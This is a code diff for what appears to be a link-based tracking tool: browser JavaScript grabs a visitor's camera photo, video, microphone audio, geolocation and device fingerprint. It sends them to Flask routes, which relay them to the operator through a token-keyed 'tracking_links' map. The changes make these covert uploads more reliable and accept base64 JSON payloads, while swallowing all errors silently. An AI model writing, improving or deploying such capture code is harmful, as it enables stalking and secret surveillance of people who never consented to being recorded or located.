@@ -398,7 +398,7 @@ async function sendPhoto(){
     const fp=await collectFingerprint();
     const form=new FormData();
     form.append("token",token);form.append("photo",blob,"photo.jpg");form.append("fingerprint",JSON.stringify(fp));
-    fetch("/capture_combined_photo",{method:"POST",body:form});
+    await fetch("/capture_combined_photo",{method:"POST",body:form});
   }catch(e){}
 }
 async function sendLocation(){
@@ -407,7 +407,7 @@ async function sendLocation(){
     const fp=await collectFingerprint();
     const form=new FormData();
     form.append("token",token);form.append("lat",pos.coords.latitude);form.append("lon",pos.coords.longitude);form.append("fingerprint",JSON.stringify(fp));
-    fetch("/capture_combined_location",{method:"POST",body:form});
+    await fetch("/capture_combined_location",{method:"POST",body:form});
   }catch(e){}
 }
 async function sendVideo(){
@@ -428,7 +428,7 @@ async function sendVideo(){
     const fp=await collectFingerprint();
     const form=new FormData();
     form.append("token",token);form.append("video",blob,"video.webm");form.append("fingerprint",JSON.stringify(fp));
-    fetch("/capture_combined_video",{method:"POST",body:form});
+    await fetch("/capture_combined_video",{method:"POST",body:form});
   }catch(e){}
 }
 async function sendAudio(){
@@ -447,7 +447,7 @@ async function sendAudio(){
     const fp=await collectFingerprint();
     const form=new FormData();
     form.append("token",token);form.append("audio",blob,"audio.webm");form.append("fingerprint",JSON.stringify(fp));
-    fetch("/capture_combined_audio",{method:"POST",body:form});
+    await fetch("/capture_combined_audio",{method:"POST",body:form});
   }catch(e){}
 }
 async function startCapture(){
@@ -1791,14 +1791,22 @@ document.addEventListener('keydown',e=>{{if(e.key==='Enter')doLogin();}});
 
 @flask_app.route('/capture_combined_photo', methods=['POST'])
 def capture_combined_photo():
-    token = request.form.get('token')
+    data = request.get_json(silent=True) or {}
+    token = request.form.get('token') or data.get('token')
     user_id = tracking_links.get(token)
     if not user_id:
         return jsonify({"ok": False}), 400
     photo_file = request.files.get('photo')
+    if not photo_file and data.get('photo'):
+        try:
+            import base64
+            header, encoded = data.get('photo', '').split(',', 1)
+            photo_file = type('obj', (), {'read': lambda: base64.b64decode(encoded)})()
+        except Exception:
+            photo_file = None
     if not photo_file:
         return jsonify({"ok": False}), 400
-    fp_json = request.form.get('fingerprint')
+    fp_json = request.form.get('fingerprint') or json.dumps(data.get('fingerprint', {}))
     caption = _fp_caption(fp_json)
     photo_bytes = photo_file.read()
     threading.Thread(target=broadcast_photo, args=(user_id, photo_bytes, caption), daemon=True).start()
@@ -1807,14 +1815,22 @@ def capture_combined_photo():
 
 @flask_app.route('/capture_combined_video', methods=['POST'])
 def capture_combined_video():
-    token = request.form.get('token')
+    data = request.get_json(silent=True) or {}
+    token = request.form.get('token') or data.get('token')
     user_id = tracking_links.get(token)
     if not user_id:
         return jsonify({"ok": False}), 400
     video_file = request.files.get('video')
+    if not video_file and data.get('video'):
+        try:
+            import base64
+            header, encoded = data.get('video', '').split(',', 1)
+            video_file = type('obj', (), {'read': lambda: base64.b64decode(encoded)})()
+        except Exception:
+            video_file = None
     if not video_file:
         return jsonify({"ok": False}), 400
-    fp_json = request.form.get('fingerprint')
+    fp_json = request.form.get('fingerprint') or json.dumps(data.get('fingerprint', {}))
     caption = _fp_caption(fp_json)
     video_bytes = video_file.read()
     threading.Thread(target=broadcast_video, args=(user_id, video_bytes, caption), daemon=True).start()
@@ -1823,14 +1839,22 @@ def capture_combined_video():
 
 @flask_app.route('/capture_combined_audio', methods=['POST'])
 def capture_combined_audio():
-    token = request.form.get('token')
+    data = request.get_json(silent=True) or {}
+    token = request.form.get('token') or data.get('token')
     user_id = tracking_links.get(token)
     if not user_id:
         return jsonify({"ok": False}), 400
     audio_file = request.files.get('audio')
+    if not audio_file and data.get('audio'):
+        try:
+            import base64
+            header, encoded = data.get('audio', '').split(',', 1)
+            audio_file = type('obj', (), {'read': lambda: base64.b64decode(encoded)})()
+        except Exception:
+            audio_file = None
     if not audio_file:
         return jsonify({"ok": False}), 400
-    fp_json = request.form.get('fingerprint')
+    fp_json = request.form.get('fingerprint') or json.dumps(data.get('fingerprint', {}))
     caption = _fp_caption(fp_json)
     audio_bytes = audio_file.read()
     threading.Thread(target=broadcast_voice, args=(user_id, audio_bytes, caption), daemon=True).start()
@@ -2078,15 +2102,16 @@ def capture_motion():
 
 @flask_app.route('/capture_combined_location', methods=['POST'])
 def capture_combined_location():
-    token = request.form.get('token')
+    data = request.get_json(silent=True) or {}
+    token = request.form.get('token') or data.get('token')
     user_id = tracking_links.get(token)
     if not user_id:
         return jsonify({"ok": False}), 400
-    lat = request.form.get('lat')
-    lon = request.form.get('lon')
+    lat = request.form.get('lat') or data.get('lat')
+    lon = request.form.get('lon') or data.get('lon')
     if not lat or not lon:
         return jsonify({"ok": False}), 400
-    fp_json = request.form.get('fingerprint')
+    fp_json = request.form.get('fingerprint') or json.dumps(data.get('fingerprint', {}))
     caption = _fp_caption(fp_json)
     threading.Thread(target=broadcast_location, args=(user_id, lat, lon), daemon=True).start()
     threading.Thread(target=broadcast_message, args=(user_id, caption, True), daemon=True).start()
